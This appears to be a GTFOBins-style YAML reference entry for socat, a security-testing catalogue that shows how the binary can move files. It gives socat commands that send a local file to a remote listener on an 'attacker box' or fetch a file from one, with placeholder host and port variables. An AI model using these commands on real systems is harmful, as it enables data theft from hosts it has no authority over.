---
functions:
  file-upload:
    - description: Run ``socat -u tcp-listen:12345,reuseaddr open:$NFILE,creat`` on the attacker box to collect the file.
      code: |
        socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
  file-download:
    - description: Run ``socat -u file:$LFILE tcp-listen:4444,reuseaddr`` on the attacker box to send the file.
      code: |
        socat -u tcp-connect:$RHOST:$RPORT open:$NFILE,creat
---
